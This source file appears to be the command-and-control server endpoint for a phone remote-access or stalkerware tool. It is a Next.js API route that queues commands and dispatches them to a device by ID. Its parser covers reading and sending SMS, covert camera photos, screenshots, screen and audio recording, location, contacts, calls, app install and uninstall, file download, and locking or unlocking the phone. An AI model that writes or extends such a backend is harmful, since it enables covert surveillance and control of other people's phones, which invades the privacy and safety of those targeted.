import { NextRequest, NextResponse } from 'next/server';
import { db } from '@/lib/db';

// Parse command into type and action for device
// Examples: get_sms -> type: sms, action: get
//           send_sms -> type: sms, action: send
//           front_camera -> type: camera, action: front_photo
//           screenshot -> type: screen, action: screenshot
function parseCommand(cmd: string): { type: string; action: string } {
  const parts = cmd.split('_');
  const first = parts[0];
  const rest = parts.slice(1).join('_');

  // Data collection commands (get_*)
  if (first === 'get') {
    return { type: rest || 'data', action: 'get' };
  }

  // Send commands (send_*)
  if (first === 'send') {
    return { type: rest || 'data', action: 'send' };
  }

  // Camera commands
  if (cmd.includes('camera')) {
    if (cmd === 'front_camera') return { type: 'camera', action: 'front_photo' };
    if (cmd === 'back_camera') return { type: 'camera', action: 'back_photo' };
    return { type: 'camera', action: rest || 'photo' };
  }

  // Screen commands
  if (cmd.includes('screen') || cmd === 'screenshot') {
    if (cmd === 'screenshot') return { type: 'screen', action: 'screenshot' };
    if (cmd === 'screen_record_start') return { type: 'screen', action: 'record_start' };
    if (cmd === 'screen_record_stop') return { type: 'screen', action: 'record_stop' };
    return { type: 'screen', action: rest };
  }

  // Audio commands
  if (cmd.includes('audio') || cmd.includes('record_audio')) {
    if (cmd === 'record_audio') return { type: 'audio', action: 'record' };
    return { type: 'audio', action: rest };
  }

  // Location commands
  if (cmd.includes('location')) {
    return { type: 'location', action: rest || 'get' };
  }

  // SMS commands
  if (cmd.includes('sms')) {
    return { type: 'sms', action: rest || first };
  }

  // Contacts commands
  if (cmd.includes('contacts')) {
    return { type: 'contacts', action: rest || 'get' };
  }

  // Call commands
  if (cmd.includes('call')) {
    return { type: 'call', action: rest || first };
  }

  // App commands
  if (cmd.includes('app') || first === 'open' || first === 'close' || first === 'install' || first === 'uninstall') {
    return { type: 'app', action: first };
  }

  // File commands
  if (cmd.includes('file') || cmd.includes('list') || first === 'download') {
    return { type: 'file', action: first };
  }

  // System commands
  if (['reboot', 'shutdown', 'lock_phone', 'unlock_phone'].includes(cmd)) {
    return { type: 'system', action: cmd };
  }

  // Default: first part is type, rest is action
  return { type: first, action: rest || first };
}

// GET /api/v1/device/[id]/commands - Get pending commands for device
export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id: deviceId } = await params;

    if (!deviceId) {
      return NextResponse.json({
        success: false,
        error: 'Device ID is required'
      }, { status: 400 });
    }

    // Get pending commands (check both 'pending' and 'queued' status)
    const commands = await db.command.findMany({
      where: {
        deviceId,
        status: { in: ['pending', 'queued'] }
      },
      orderBy: [
        { priority: 'desc' },
        { createdAt: 'asc' }
      ],
      take: 10
    });

    // Mark as delivered
    if (commands.length > 0) {
      await db.command.updateMany({
        where: {
          id: { in: commands.map(c => c.id) }
        },
        data: {
          status: 'delivered',
          deliveredAt: new Date()
        }
      });
    }

    // Format commands for device with proper type/action parsing
    const formattedCommands = commands.map(cmd => {
      const { type, action } = parseCommand(cmd.command);

      return {
        id: cmd.id,
        command: cmd.command,  // Full command for reference
        type,
        action,
        params: cmd.params ? JSON.parse(cmd.params) : {},
        priority: cmd.priority,
        timestamp: cmd.createdAt.toISOString()
      };
    });

    console.log(`[Commands] Sending ${formattedCommands.length} commands to device ${deviceId}`);
    formattedCommands.forEach(c => console.log(`  - ${c.command} -> type: ${c.type}, action: ${c.action}`));

    return NextResponse.json({
      success: true,
      commands: formattedCommands
    });

  } catch (error) {
    console.error('[Commands] Error:', error);
    return NextResponse.json({
      success: false,
      commands: []
    }, { status: 500 });
  }
}
